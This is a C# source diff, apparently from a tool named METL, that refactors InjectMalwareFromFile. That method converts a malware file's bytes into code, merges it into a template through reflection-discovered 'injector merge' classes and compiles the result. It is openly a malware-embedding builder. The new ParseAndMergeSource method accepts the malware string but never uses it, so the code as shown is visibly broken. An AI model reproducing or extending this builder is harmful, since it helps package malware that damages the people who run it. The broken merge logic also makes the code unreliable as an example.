@@ -4,6 +4,7 @@ using System.Diagnostics.CodeAnalysis;
 using System.IO;
 using System.Linq;
 using System.Reflection;
+using METL.InjectorMerges.Base;
 using Microsoft.CodeAnalysis;
 using Microsoft.CodeAnalysis.CSharp;
 
@@ -63,6 +64,18 @@ namespace METL
             return null;
         }
 
+        private static string ParseAndMergeSource(string sourceFile, string malwareEmbedString)
+        {
+            var merges = Assembly.GetAssembly(typeof(BaseInjectorMerge)).GetTypes().Where(a => a.BaseType == typeof(BaseInjectorMerge) && !a.IsAbstract).Select(b => (BaseInjectorMerge)Activator.CreateInstance(b)).ToList();
+
+            foreach (var merge in merges)
+            {
+                sourceFile = sourceFile.Replace($"[{merge.FIELD_NAME}]", merge.Merge());
+            }
+
+            return sourceFile;
+        }
+
         public static byte[] InjectMalwareFromFile([NotNull] string sourceFileName, [NotNull] string malwareFileName)
         {
             if (string.IsNullOrEmpty(sourceFileName))
@@ -91,9 +104,7 @@ namespace METL
 
             var malwareCodeFileText = GenerateCodeFromBytes(malwareBytes);
 
-            sourceCodeFileText = sourceCodeFileText.Replace("[PLACEHOLDER]", malwareCodeFileText);
-
-            return CompileCodeToBytes(sourceCodeFileText);
+            return CompileCodeToBytes(ParseAndMergeSource(sourceCodeFileText, malwareCodeFileText));
         }
     }
 }
